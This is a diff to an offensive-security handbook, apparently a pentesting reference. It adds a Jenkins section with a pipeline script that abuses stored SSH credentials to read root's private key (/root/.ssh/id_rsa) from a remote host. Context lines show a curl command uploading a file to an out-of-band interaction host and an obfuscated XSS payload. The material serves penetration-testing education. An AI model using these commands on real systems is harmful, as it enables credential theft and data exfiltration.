@@ -40,6 +40,7 @@
 - [httpx](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#httpx)
 - [Interactsh](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Interactsh)
 - [JavaScript](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#JavaScript)
+- [Jenkins](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Jenkins)
 - [jsleak](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#jsleak)
 - [JWT_Tool](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#JWT_Tool)
 - [Kyubi](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Kyubi)
@@ -1174,6 +1175,30 @@ $ curl -F "out=@/PATH/TO/FILE/<FILE>.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oas
 
 ```c
 <img src onerror="(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]) [+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]++[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]">
+```
+
+## Jenkins
+
+### Read SSH Keys through Pipelines
+
+The following example the `SSH Agent Plugin` enabled.
+
+```c
+pipeline {
+    agent any
+    
+    stages {
+        stage('SSH') {
+            steps {
+                script {
+                    sshagent(credentials: ['1']) {
+                        sh 'ssh -o StrictHostKeyChecking=no root@<RHOST> "cat /root/.ssh/id_rsa"'
+                    }
+                }
+            }
+        }
+    }
+}
 ```
 
 ## jsleak
